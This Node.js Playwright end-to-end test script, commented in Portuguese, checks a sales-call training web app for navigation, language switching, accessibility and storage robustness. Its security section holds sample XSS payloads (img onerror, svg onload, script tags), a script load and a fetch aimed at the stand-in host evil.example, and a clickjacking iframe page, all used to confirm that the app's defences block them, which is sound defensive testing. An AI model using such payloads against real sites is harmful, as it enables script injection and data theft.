#!/usr/bin/env node
/**
 * Smoke E2E do AI Call Trainer.
 *
 * Por que existe: a suíte unitária cobre as funções puras (notas, métricas,
 * storage), mas nada garantia que o loop principal — escolher cenário, fazer a
 * call, ver o scorecard — continuasse de pé numa build real. Essa verificação
 * vivia em scripts soltos fora do repositório, então não era reproduzível.
 *
 * Como rodar:
 *   npm run build
 *   npm run test:e2e                       # sobe `vite preview` sozinho
 *   BASE_URL=http://localhost:5173 npm run test:e2e   # usa um servidor já no ar
 *
 * Playwright não é dependência do projeto de propósito (traz ~150 MB de
 * navegador). Se não estiver instalado, o script avisa e sai sem falhar:
 *   npm i -D playwright && npx playwright install chromium
 */

import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import process from 'node:process';
import { startProdServer } from './prod-server.mjs';

const PORT = Number(process.env.PORT ?? 4173);
const BASE_URL = process.env.BASE_URL ?? `http://localhost:${PORT}`;
const HEADLESS = process.env.HEADED !== '1';

/**
 * Resolve o playwright de onde ele estiver.
 *
 * `import` só olha o node_modules do projeto; `require` também cai nos
 * caminhos globais do Node. Tentar os dois faz o script funcionar tanto com um
 * devDependency local quanto com uma instalação global da máquina.
 */
async function loadPlaywright() {
  try {
    return await import('playwright');
  } catch {
    try {
      return createRequire(import.meta.url)('playwright');
    } catch {
      return null;
    }
  }
}

const playwright = await loadPlaywright();
if (!playwright) {
  console.log(
    'SKIP: playwright não encontrado.\n' +
      '      npm i -D playwright && npx playwright install chromium',
  );
  process.exit(0);
}
const { chromium } = playwright;

/**
 * axe-core, também opcional e resolvido do mesmo jeito. Sem ele a verificação
 * de acessibilidade é pulada (com aviso) em vez de falhar a suíte.
 */
function loadAxeSource() {
  try {
    const require = createRequire(import.meta.url);
    return readFileSync(require.resolve('axe-core/axe.min.js'), 'utf8');
  } catch {
    return null;
  }
}
const AXE_SOURCE = loadAxeSource();

// ---------- servidor ----------

/** Espera o servidor responder, ou desiste. */
async function waitForServer(url, timeoutMs = 30_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const res = await fetch(url, { signal: AbortSignal.timeout(2000) });
      if (res.ok) return true;
    } catch {
      /* ainda subindo */
    }
    await new Promise((r) => setTimeout(r, 300));
  }
  return false;
}

let server = null;
async function startServer() {
  if (process.env.BASE_URL) return; // servidor externo: não mexe
  if (await waitForServer(BASE_URL, 1500)) return; // já está no ar
  server = spawn('npx', ['vite', 'preview', '--port', String(PORT), '--strictPort'], {
    stdio: 'ignore',
    detached: false,
  });
  if (!(await waitForServer(BASE_URL))) {
    throw new Error(`servidor não subiu em ${BASE_URL} — rodou \`npm run build\`?`);
  }
}

/** Servidor que aplica as regras do vercel.json (headers/CSP). Ver e2e/prod-server.mjs. */
let prod = null;

function stopServer() {
  if (prod) void prod.close();
  if (server && !server.killed) server.kill('SIGTERM');
}

// ---------- harness ----------

const results = [];
let browser;

/**
 * Roda uma verificação numa aba limpa.
 *
 * Por padrão pré-marca onboarding como visto e idioma como inglês, para os
 * testes não dependerem do overlay de primeira visita nem do idioma salvo.
 */
async function check(name, fn, { seed = true, collectErrors = true, viewport } = {}) {
  const context = await browser.newContext(viewport ? { viewport, hasTouch: viewport.width < 600 } : {});
  const page = await context.newPage();
  const consoleErrors = [];

  if (collectErrors) {
    page.on('console', (m) => {
      if (m.type() === 'error') consoleErrors.push(m.text());
    });
    page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));
  }
  if (seed) {
    await page.addInitScript(() => {
      try {
        // Só define o que ainda não existe. addInitScript roda a cada
        // navegação, reload incluído: sobrescrever aqui apagaria uma escolha
        // feita durante o teste (ex.: trocar o idioma e recarregar).
        if (localStorage.getItem('act.onboarded') === null) {
          localStorage.setItem('act.onboarded', '1');
        }
        if (localStorage.getItem('act.ui_lang') === null) {
          localStorage.setItem('act.ui_lang', 'en');
        }
      } catch {
        /* storage negado: o teste que cobre isso não usa seed */
      }
    });
  }

  try {
    await fn(page, consoleErrors);
    if (collectErrors && consoleErrors.length > 0) {
      throw new Error(`console com erros:\n       ${consoleErrors.join('\n       ')}`);
    }
    results.push({ name, ok: true });
    console.log(`  ✓ ${name}`);
  } catch (err) {
    results.push({ name, ok: false, err: err.message });
    console.log(`  ✗ ${name}\n       ${err.message}`);
  } finally {
    await context.close();
  }
}

/** Afirma que um locator está visível, com mensagem útil no erro. */
async function expectVisible(locator, what) {
  await locator.first().waitFor({ state: 'visible', timeout: 10_000 }).catch(() => {
    throw new Error(`não encontrei: ${what}`);
  });
}

// ---------- verificações ----------

/** Leva uma call completa até o scorecard, em modo texto. */
async function runCallToScorecard(page) {
  await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
  await page.getByRole('link', { name: /Start call/i }).first().click();

  await expectVisible(page.getByRole('heading', { name: /briefing/i }), 'tela de briefing');
  // Headless não tem reconhecimento de voz: garante modo texto explicitamente.
  await page.getByRole('button', { name: /⌨️/ }).click();
  await page.getByRole('button', { name: /📞/ }).click();

  const input = page.getByPlaceholder(/Type your line/i);
  await expectVisible(input, 'campo de texto da call');

  const lines = [
    'Hi, this is Ana from Salesforce — did I catch you at a bad time?',
    'Totally fair. Quick context: how does your team track follow-ups today?',
    'That makes sense. What does a missed follow-up cost you in a quarter?',
  ];
  for (const line of lines) {
    await input.fill(line);
    await page.getByRole('button', { name: /^Send$/ }).click();
    // Espera o prospect responder antes da próxima fala.
    await page.waitForTimeout(1200);
  }

  await page.getByRole('button', { name: /Hang up/i }).click();
  await expectVisible(page.getByText(/How did the call end/i), 'pergunta de desfecho');
  await page.getByRole('button', { name: /Just ended the practice/i }).click();

  await page.waitForURL(/\/scorecard\//, { timeout: 30_000 });
}

async function main() {
  await startServer();
  prod = await startProdServer(Number(process.env.PROD_PORT ?? 4180));
  browser = await chromium.launch({ headless: HEADLESS });
  console.log(`\nE2E em ${BASE_URL}\n`);

  await check('home lista cenários', async (page) => {
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    await expectVisible(page.getByRole('heading', { name: /Pick your scenario/i }), 'título da home');
    const starts = page.getByRole('link', { name: /Start call/i });
    if ((await starts.count()) < 3) throw new Error('menos de 3 cenários na home');
  });

  await check('home oferece os quatro tipos de call', async (page) => {
    // `negotiation` já foi um tipo órfão: rótulo traduzido, opção na
    // Biblioteca e nenhum cenário para treinar.
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    for (const label of ['Cold call', 'Discovery', 'Demo', 'Negotiation']) {
      await expectVisible(page.getByText(label, { exact: true }), `cenário do tipo "${label}"`);
    }
  });

  await check('onboarding aparece na primeira visita e não volta', async (page) => {
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    await expectVisible(page.getByText(/Welcome to AI Call Trainer/i), 'overlay de onboarding');
    await page.getByRole('button', { name: /Start training/i }).click();
    await page.reload({ waitUntil: 'networkidle' });
    if (await page.getByText(/Welcome to AI Call Trainer/i).isVisible()) {
      throw new Error('onboarding voltou depois de dispensado');
    }
  }, { seed: false });

  await check('troca de idioma persiste depois do reload', async (page) => {
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    // O botão mostra a sigla, mas o nome acessível é o idioma por extenso.
    await page.getByRole('button', { name: 'Português' }).click();
    await expectVisible(page.getByRole('link', { name: 'Cenários' }), 'navegação em português');
    await page.reload({ waitUntil: 'networkidle' });
    await expectVisible(page.getByRole('link', { name: 'Cenários' }), 'português após reload');

    await page.getByRole('button', { name: 'Italiano' }).click();
    await expectVisible(page.getByRole('link', { name: 'Scenari' }), 'navegação em italiano');

    // O seletor tem que se anunciar: grupo rotulado, nome completo do idioma e
    // qual está ativo. Antes era só "pt, botão", sem contexto nem estado.
    await expectVisible(
      page.getByRole('group', { name: /Lingua dell|Idioma|Interface language/i }),
      'grupo rotulado do seletor de idioma',
    );
    const active = page.getByRole('button', { name: 'Italiano' });
    if ((await active.getAttribute('aria-pressed')) !== 'true') {
      throw new Error('idioma ativo não está marcado com aria-pressed');
    }
  });

  await check('URL inválida mostra o 404 com saída', async (page) => {
    await page.goto(`${BASE_URL}/rota-que-nao-existe`, { waitUntil: 'networkidle' });
    await expectVisible(page.getByRole('heading', { name: /Page not found/i }), 'página 404');
    await page.getByRole('link', { name: /Back to home/i }).click();
    await expectVisible(page.getByRole('heading', { name: /Pick your scenario/i }), 'home após o 404');
  });

  await check('call completa chega ao scorecard com nota', async (page) => {
    await runCallToScorecard(page);
    await expectVisible(page.getByText(/\/100|Overall/i), 'nota geral no scorecard');
    // O transcript da call tem que estar lá: é o que dá credibilidade à nota.
    await expectVisible(page.getByText(/did I catch you at a bad time/i), 'transcript no scorecard');
  });

  await check('progresso registra a call feita', async (page) => {
    await runCallToScorecard(page);
    await page.getByRole('link', { name: /^Progress$/ }).click();
    await expectVisible(page.getByText(/Level|XP/i), 'painel de nível');
  });

  await check('drill de objeções pontua uma resposta', async (page) => {
    await page.goto(`${BASE_URL}/drill`, { waitUntil: 'networkidle' });
    await page.getByRole('button', { name: /Start the gauntlet/i }).click();
    const answer = page.getByPlaceholder(/Answer as if/i);
    await expectVisible(answer, 'campo de resposta do drill');
    await answer.fill(
      'I understand — budget is always tight. Before I answer, what would you need to see to justify it? Most teams here recover the cost in the first quarter through faster follow-ups.',
    );
    await page.getByRole('button', { name: /^Respond$/ }).click();
    await expectVisible(page.getByText(/Model answer/i), 'resposta modelo');
    await expectVisible(page.getByText(/Response score/i), 'nota da resposta');
  });

  await check('cold email lab pontua e limpa', async (page) => {
    await page.goto(`${BASE_URL}/email`, { waitUntil: 'networkidle' });
    const subject = page.getByLabel(/Subject/i);
    const body = page.getByLabel(/Email body/i);
    await subject.fill('Quick question about rep onboarding');
    await body.fill(
      'Noticed your team hired four reps this quarter. Most teams that scale that fast lose weeks to inconsistent ramp-up. How are you handling onboarding today? Worth 15 minutes on Thursday to compare notes?',
    );
    await page.getByRole('button', { name: /Analyze/i }).click();
    await expectVisible(page.getByText(/Checks|\/100/i), 'resultado da análise');

    await page.getByRole('button', { name: /^Clear$/ }).click();
    if ((await body.inputValue()) !== '') throw new Error('Clear não limpou o corpo do e-mail');
    if ((await subject.inputValue()) !== '') throw new Error('Clear não limpou o assunto');
  });

  await check('página legal abre', async (page) => {
    await page.goto(`${BASE_URL}/legal`, { waitUntil: 'networkidle' });
    await expectVisible(page.getByRole('heading').first(), 'conteúdo da página legal');
  });

  // ---- Regressões específicas (bugs já corrigidos; ficam presos aqui) ----

  await check('REGRESSÃO: app arranca com localStorage negado', async (page) => {
    // Safari privado e escudos do Brave fazem o próprio acesso a
    // window.localStorage lançar. O provider de i18n lia uma chave num
    // inicializador de estado, então o app não renderizava nada: tela branca.
    await page.addInitScript(() => {
      Object.defineProperty(window, 'localStorage', {
        configurable: true,
        get() {
          throw new DOMException('Access is denied for this document.', 'SecurityError');
        },
      });
    });
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    await expectVisible(
      page.getByRole('heading', { name: /Pick your scenario/i }),
      'home com storage negado',
    );
    // Navegar também não pode quebrar.
    await page.getByRole('link', { name: /^Email$/ }).click();
    await expectVisible(page.getByRole('button', { name: /Analyze/i }), 'email lab com storage negado');
  }, { seed: false });

  await check('REGRESSÃO: falha de chunk cai no ErrorBoundary, não em tela branca', async (page) => {
    // Falha realista: deploy novo invalida o chunk que o cliente antigo pede.
    // Antes isto era uma página vazia; agora tem cartão de recuperação e a
    // navegação continua de pé (boundary interno).
    await page.route('**/assets/Drill-*.js', (route) => route.abort());
    await page.goto(`${BASE_URL}/drill`, { waitUntil: 'domcontentloaded' });
    await expectVisible(page.getByRole('alert'), 'cartão de recuperação do ErrorBoundary');
    await expectVisible(page.getByRole('button', { name: /Reload/i }), 'botão de recarregar');
    await expectVisible(page.getByRole('link', { name: /^Scenarios$/ }), 'navegação preservada');
  }, { collectErrors: false }); // o chunk abortado loga erro de rede, é o esperado

  // ---- Celular e acessibilidade ----

  /**
   * Em 375px o cabeçalho (logo + 5 links + idiomas, numa linha que não quebrava)
   * fazia TODAS as páginas rolarem para o lado: 554px em inglês, 601px em
   * italiano. 320px cobre os celulares pequenos. O texto em italiano é o mais
   * longo dos três idiomas, então é o pior caso para o layout.
   */
  for (const width of [375, 320]) {
    await check(`MOBILE: sem overflow horizontal em ${width}px (EN e IT)`, async (page) => {
      const routes = ['/', '/drill', '/email', '/progress', '/library', '/legal', '/rota-invalida'];
      for (const lang of ['en', 'it']) {
        // Grava o idioma uma vez por rodada; as navegações seguintes o leem.
        await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
        await page.evaluate((l) => localStorage.setItem('act.ui_lang', l), lang);
        for (const route of routes) {
          await page.goto(`${BASE_URL}${route}`, { waitUntil: 'networkidle' });
          await page.waitForTimeout(250);
          const { sw, iw } = await page.evaluate(() => ({
            sw: document.documentElement.scrollWidth,
            iw: window.innerWidth,
          }));
          if (sw > iw) throw new Error(`${route} (${lang}) mede ${sw}px numa tela de ${iw}px`);
        }
      }
    }, { viewport: { width, height: 700 } });
  }

  if (!AXE_SOURCE) {
    console.log('  - A11Y: pulado (axe-core não encontrado) — npm i -D axe-core');
  } else {
    /**
     * WCAG 2.1 A/AA com axe-core. O README afirmava conformidade, mas uma
     * auditoria real achou 120 elementos de baixo contraste, um <select> sem nome
     * e um input de edição da transcrição totalmente anônimo.
     */
    const AXE_TAGS = ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'];
    /**
     * Repete até estabilizar, em vez de medir uma vez.
     *
     * O scorecard tem animação de entrada: medido a 400ms, o axe via 28 falhas de
     * contraste (cores semitransparentes no meio do fade-in); a partir de 1s, zero.
     * Isso é falso positivo de timing, não defeito. Passa assim que uma medição
     * vier limpa e só falha se a violação PERSISTIR por 3s — o que ainda pega
     * contraste real, que não some sozinho.
     */
    const audit = async (page, where, settleMs = 3000) => {
      await page.evaluate(AXE_SOURCE);
      const deadline = Date.now() + settleMs;
      let violations;
      do {
        await page.waitForTimeout(350);
        ({ violations } = await page.evaluate(
          (tags) => axe.run(document, { runOnly: { type: 'tag', values: tags } }),
          AXE_TAGS,
        ));
        if (violations.length === 0) return;
      } while (Date.now() < deadline);

      const lines = violations.map(
        (v) => `${v.id} ×${v.nodes.length} (${v.impact}) em ${where}: ${v.nodes[0].html.slice(0, 90)}`,
      );
      throw new Error(lines.join('\n       '));
    };

    await check('A11Y: páginas estáticas sem violações WCAG 2.1 AA', async (page) => {
      for (const route of ['/', '/drill', '/email', '/progress', '/library', '/legal', '/rota-invalida']) {
        await page.goto(`${BASE_URL}${route}`, { waitUntil: 'networkidle' });
        await audit(page, route);
      }
    });

    await check('A11Y: onboarding sem violações', async (page) => {
      await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
      await audit(page, 'onboarding');
    }, { seed: false });

    await check('A11Y: call, scorecard e progresso sem violações', async (page) => {
      await runCallToScorecard(page);
      await audit(page, 'scorecard');
      await page.goto(`${BASE_URL}/progress`, { waitUntil: 'networkidle' });
      await audit(page, 'progress com dados');
    });

    await check('A11Y: drill e email lab em uso, sem violações', async (page) => {
      await page.goto(`${BASE_URL}/drill`, { waitUntil: 'networkidle' });
      await page.getByRole('button', { name: /Start the gauntlet/i }).click();
      await page.getByPlaceholder(/Answer as if/i).fill(
        'I understand. What would you need to see to justify it? Most teams recover the cost in a quarter.',
      );
      await audit(page, 'drill: pergunta');
      await page.getByRole('button', { name: /^Respond$/ }).click();
      await expectVisible(page.getByText(/Model answer/i), 'resposta modelo');
      await audit(page, 'drill: feedback');

      await page.goto(`${BASE_URL}/email`, { waitUntil: 'networkidle' });
      await page.getByLabel(/Subject/i).fill('Quick question about onboarding');
      await page.getByLabel(/Email body/i).fill(
        'Noticed your team hired four reps. How are you handling onboarding today? Worth 15 minutes Thursday?',
      );
      await page.getByRole('button', { name: /Analyze/i }).click();
      await audit(page, 'email: resultado');
    });
  }


  // ---- Segurança: o que o navegador de um usuário real vai impor ----
  //
  // `vite preview` NÃO lê o vercel.json, então os headers de segurança nunca
  // tinham rodado contra o build. Estes checks usam e2e/prod-server.mjs, que
  // serve dist/ com EXATAMENTE as regras do vercel.json.
  const PROD = prod.url;

  await check('SEGURANÇA: headers do vercel.json estão presentes no documento', async (page) => {
    const res = await page.request.get(`${PROD}/`);
    const h = res.headers();
    const need = {
      'content-security-policy': /default-src 'self'.*frame-ancestors 'none'.*object-src 'none'/,
      'strict-transport-security': /max-age=\d{7,}/,
      'x-frame-options': /^DENY$/i,
      'x-content-type-options': /^nosniff$/i,
      'referrer-policy': /strict-origin/,
      'permissions-policy': /camera=\(\)/,
      'cross-origin-opener-policy': /^same-origin$/,
      'cross-origin-resource-policy': /^same-origin$/,
    };
    for (const [name, re] of Object.entries(need)) {
      if (!h[name]) throw new Error(`header ausente: ${name}`);
      if (!re.test(h[name])) throw new Error(`header ${name} com valor inesperado: ${h[name]}`);
    }
    // A política não pode ter sido afrouxada: nada de unsafe-eval/inline em script.
    const scriptSrc = /script-src([^;]*)/.exec(h['content-security-policy'])?.[1] ?? '';
    if (/unsafe-(eval|inline)|\*/.test(scriptSrc)) throw new Error(`script-src afrouxado: ${scriptSrc}`);
  }, { collectErrors: false });

  await check('SEGURANÇA: o CSP não bloqueia o app e bloqueia script inline/externo/exfiltração', async (page) => {
    await page.addInitScript(() => {
      window.__csp = [];
      document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ← ${e.blockedURI}`));
    });
    // Uso normal completo sob o CSP real, incluindo o service worker.
    for (const route of ['/', '/drill', '/email', '/library', '/legal', '/progress']) {
      await page.goto(`${PROD}${route}`, { waitUntil: 'networkidle' });
    }
    await page.goto(`${PROD}/`, { waitUntil: 'networkidle' });
    await page.getByRole('link', { name: /Start call/i }).first().click();
    await page.locator('button').nth(-2).click();
    await page.locator('button').last().click();
    const input = page.getByPlaceholder(/Type your line/i);
    await expectVisible(input, 'campo da call sob o CSP');
    await input.fill('Hi, quick question about follow-ups.');
    await page.getByRole('button', { name: /^Send$/ }).click();
    await page.waitForTimeout(1200);

    const violationsBefore = await page.evaluate(() => window.__csp.length);
    if (violationsBefore > 0) {
      const list = await page.evaluate(() => window.__csp.join(' | '));
      throw new Error(`o CSP bloqueou o próprio app: ${list}`);
    }
    // Agora o ataque: tem de ser bloqueado. (eval fica de fora de propósito: o
    // DevTools Protocol é isento de CSP, então um eval via page.evaluate roda
    // mesmo com a política ativa e não prova nada.)
    const r = await page.evaluate(async () => {
      const s = document.createElement('script');
      s.textContent = 'window.__inline = 1';
      document.head.appendChild(s);
      await new Promise((ok) => {
        const x = document.createElement('script');
        x.src = 'https://evil.example/x.js';
        x.onerror = x.onload = () => ok();
        document.head.appendChild(x);
        setTimeout(ok, 1500);
      });
      let exfil = 'permitido';
      try { await fetch('https://evil.example/', { mode: 'no-cors' }); } catch { exfil = 'bloqueado'; }
      return { inline: window.__inline === 1, exfil, violations: window.__csp.length };
    });
    if (r.inline) throw new Error('script inline executou apesar do CSP');
    if (r.exfil !== 'bloqueado') throw new Error('fetch para origem externa não foi bloqueado');
    if (r.violations < 2) throw new Error(`esperava ≥2 violações registradas, vieram ${r.violations}`);
  }, { collectErrors: false });

  await check('SEGURANÇA: outra origem não consegue embutir o app em iframe (clickjacking)', async (page) => {
    const evil = createServer((_q, res) => {
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(`<iframe src="${PROD}/"></iframe>`);
    });
    await new Promise((ok) => evil.listen(Number(process.env.EVIL_PORT ?? 4181), '127.0.0.1', ok));
    try {
      await page.goto(`http://127.0.0.1:${process.env.EVIL_PORT ?? 4181}/`);
      await page.waitForTimeout(1200);
      const loaded = page.frames().some((f) => f.url().startsWith(PROD));
      if (loaded) throw new Error('o app carregou dentro de um iframe de outra origem');
    } finally {
      evil.close();
    }
  }, { collectErrors: false });

  // ---- Dado hostil: o que acontece quando o storage ou um backup é ruim ----

  await check('ROBUSTEZ: dado adulterado no localStorage não derruba nenhuma tela', async () => {
    // Antes, 4 destes formatos derrubavam telas — dois derrubavam a Home — e como o
    // dado ruim ficava no storage, recarregar não resolvia.
    const SC = '00000000-0000-4000-8000-000000000301';
    const mutations = {
      'sessions=[{id}]': { 'act.sessions': '[{"id":"x"}]' },
      'sessions=[null]': { 'act.sessions': '[null]' },
      'sessions="texto"': { 'act.sessions': '"texto"' },
      'turns com content objeto': { 'act.turns': '[{"id":"t","session_id":"x","speaker":"rep","content":{"a":1},"ts":"x"}]' },
      'evaluations sem campos': { 'act.evaluations': '[{"id":"e","session_id":"s"}]' },
      'products=[{id}]': { 'act.custom_products': '[{"id":"p"}]' },
      'personas=[{id}]': { 'act.custom_personas': '[{"id":"a"}]' },
      'scenarios refs inexistentes': { 'act.custom_scenarios': '[{"id":"s","persona_id":"nope","product_id":"nope","call_type":"cold_call","difficulty":3,"language":"pt-BR","time_limit_seconds":300,"success_criteria":"x"}]' },
      'ui_lang=constructor': { 'act.ui_lang': 'constructor' },
      'drill.history="x"': { 'act.drill.history': '"x"' },
      'drill.best="x"': { 'act.drill.best': '"x"' },
    };
    const routes = ['/', '/progress', '/library', '/drill', '/email', `/call/${SC}`];
    const broken = [];
    for (const [label, data] of Object.entries(mutations)) {
      const ctx = await browser.newContext();
      const p = await ctx.newPage();
      await p.addInitScript((d) => {
        try {
          localStorage.setItem('act.onboarded', '1');
          if (localStorage.getItem('act.ui_lang') === null) localStorage.setItem('act.ui_lang', 'en');
          for (const [k, v] of Object.entries(d)) localStorage.setItem(k, v);
        } catch { /* ignora */ }
      }, data);
      for (const route of routes) {
        await p.goto(`${BASE_URL}${route}`, { waitUntil: 'domcontentloaded' }).catch(() => {});
        await p.waitForTimeout(350);
        const bad = await p.evaluate(() =>
          !!document.querySelector('[role=alert]') || (document.querySelector('main')?.innerText ?? '').trim().length < 5,
        );
        if (bad) broken.push(`${label} → ${route}`);
      }
      await ctx.close();
    }
    if (broken.length) throw new Error(`telas derrubadas:\n       ${broken.join('\n       ')}`);
  }, { collectErrors: false });

  await check('SEGURANÇA: payloads XSS em campos, backup importado e URL não executam', async (page) => {
    const PAY = '<img src=x onerror="window.__xss=(window.__xss||0)+1"><svg/onload=window.__xss=2><script>window.__xss=3</script>';
    page.on('dialog', (d) => d.dismiss());
    await page.goto(`${BASE_URL}/progress`, { waitUntil: 'networkidle' });
    const backup = {
      sessions: [], turns: [], evaluations: [], products: [],
      personas: [{ id: 'evil', name: PAY, role: PAY, company_profile: PAY, personality: { skepticism: 1, patience: 1, talkativeness: 1 }, pain_points: [PAY], hidden_objections: [PAY], buying_stage: 'cold' }],
      scenarios: [{ id: 'evil-s', persona_id: 'evil', product_id: '00000000-0000-4000-8000-000000000101', call_type: 'cold_call', difficulty: 3, language: 'en-US', time_limit_seconds: 300, success_criteria: PAY }],
    };
    await page.setInputFiles('input[type=file]', { name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(backup)) });
    await page.waitForTimeout(500);
    let displayed = false;
    for (const route of ['/', '/call/evil-s', `/call/${encodeURIComponent(PAY)}`, `/?q=${encodeURIComponent(PAY)}#${encodeURIComponent(PAY)}`]) {
      await page.goto(`${BASE_URL}${route}`, { waitUntil: 'networkidle' });
      const r = await page.evaluate(() => ({
        xss: window.__xss ?? 0,
        nodes: document.querySelectorAll('img[src="x"], svg[onload]').length,
        shown: document.body.innerText.includes('<img src=x'),
      }));
      if (r.xss || r.nodes) throw new Error(`XSS executou em ${route}: exec=${r.xss} nós=${r.nodes}`);
      displayed ||= r.shown;
    }
    // Sem isto o teste passaria vazio: o payload tem de ter sido EXIBIDO como texto.
    if (!displayed) throw new Error('o payload nunca foi exibido — o teste não exercitou nada');
  }, { collectErrors: false });

  await check('ROBUSTEZ: o ErrorBoundary oferece apagar os dados e isso funciona', async (page) => {
    await page.route('**/assets/Drill-*.js', (route) => route.abort());
    await page.goto(`${BASE_URL}/drill`, { waitUntil: 'domcontentloaded' });
    await expectVisible(page.getByRole('alert'), 'cartão do ErrorBoundary');
    await page.evaluate(() => localStorage.setItem('act.marker', 'apagar-me'));
    page.once('dialog', (d) => d.accept());
    await page.getByRole('button', { name: /Reset app data/i }).click();
    await page.waitForURL(`${BASE_URL}/`);
    const left = await page.evaluate(() => localStorage.getItem('act.marker'));
    if (left !== null) throw new Error('a chave act.* sobreviveu ao reset');
  }, { collectErrors: false });


  await check('BIBLIOTECA: produto, persona e cenário próprios sobrevivem aos guardas de schema e rodam uma call', async (page) => {
    // A validação de schema agora filtra NA LEITURA. Se os formulários gerassem
    // algo que o guarda recusa, o item criado sumiria depois de salvar. Este é o
    // fluxo que prova que não: criar os três, ver cada um listado e usá-los.
    await page.goto(`${BASE_URL}/library`, { waitUntil: 'networkidle' });

    // Produto
    await page.getByRole('button', { name: /^Products$/ }).click();
    await page.getByRole('button', { name: /New product/ }).click();
    await page.getByLabel(/^Name$/).fill('Acme Dialer');
    await page.getByLabel(/^Vendor$/).fill('Acme Inc');
    await page.getByLabel(/One-liner pitch/).fill('Calls that book themselves');
    await page.getByRole('button', { name: /^Save$/ }).click();
    await expectVisible(page.getByText('Acme Dialer'), 'produto salvo na lista');

    // Persona
    await page.getByRole('button', { name: /^Personas$/ }).click();
    await page.getByRole('button', { name: /New persona/ }).click();
    await page.getByLabel(/^Name$/).fill('Dana Whitfield');
    await page.getByLabel(/^Role$/).fill('VP Revenue');
    await page.getByLabel(/Company profile/).fill('Mid-market SaaS, 120 reps.');
    await page.getByLabel(/Pain points/).fill('Reps skip follow-ups\nForecasts are wrong');
    await page.getByLabel(/Hidden objections/).fill('We already have a dialer');
    await page.getByRole('button', { name: /^Save$/ }).click();
    await expectVisible(page.getByText('Dana Whitfield'), 'persona salva na lista');

    // Cenário usando os dois
    await page.getByRole('button', { name: /^Scenarios$/ }).click();
    await page.getByRole('button', { name: /New scenario/ }).click();
    // getByRole usa o nome ACESSÍVEL ("Persona"); getByLabel casaria com o texto bruto do
    // <label>, que inclui as opções do <select> aninhado.
    await page.getByRole('combobox', { name: 'Persona', exact: true }).selectOption({ label: 'Dana Whitfield — VP Revenue' });
    await page.getByRole('combobox', { name: 'Product', exact: true }).selectOption({ label: 'Acme Dialer' });
    await page.getByLabel(/Success criteria/).fill('Book a 20-minute demo.');
    await page.getByRole('button', { name: /^Save$/ }).click();

    // Sobrevive a um reload (passa pelo storage e pelo guarda de novo)...
    await page.reload({ waitUntil: 'networkidle' });
    await page.getByRole('button', { name: /^Products$/ }).click();
    await expectVisible(page.getByText('Acme Dialer'), 'produto depois do reload');
    await page.getByRole('button', { name: /^Personas$/ }).click();
    await expectVisible(page.getByText('Dana Whitfield'), 'persona depois do reload');

    // ...aparece na Home e roda uma call completa.
    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
    const card = page.locator('div', { hasText: 'Dana Whitfield' }).filter({ has: page.getByRole('link', { name: /Start call/i }) }).last();
    await expectVisible(card, 'cenário personalizado na Home');
    await card.getByRole('link', { name: /Start call/i }).click();
    await page.locator('button').nth(-2).click();
    await page.locator('button').last().click();
    const input = page.getByPlaceholder(/Type your line/i);
    await expectVisible(input, 'call com cenário personalizado');
    await input.fill('Hi Dana, quick question about how your reps handle follow-ups.');
    await page.getByRole('button', { name: /^Send$/ }).click();
    await page.waitForTimeout(1300);
    await page.getByRole('button', { name: /Hang up/i }).click();
    await page.getByRole('button', { name: /Just ended the practice/i }).click();
    await page.waitForURL(/\/scorecard\//, { timeout: 30_000 });
  });

  await check('PWA: manifest e service worker servidos', async (page) => {
    for (const path of ['/manifest.webmanifest', '/sw.js']) {
      const res = await page.request.get(`${BASE_URL}${path}`);
      if (!res.ok()) throw new Error(`${path} devolveu ${res.status()}`);
    }
  });

  await browser.close();
  stopServer();

  // ---------- relatório ----------
  const failed = results.filter((r) => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} verificações passaram`);
  if (failed.length > 0) {
    console.log('\nFalhas:');
    for (const f of failed) console.log(`  ✗ ${f.name}: ${f.err}`);
    process.exit(1);
  }
}

main().catch((err) => {
  console.error('\nE2E abortado:', err.message);
  stopServer();
  process.exit(1);
});
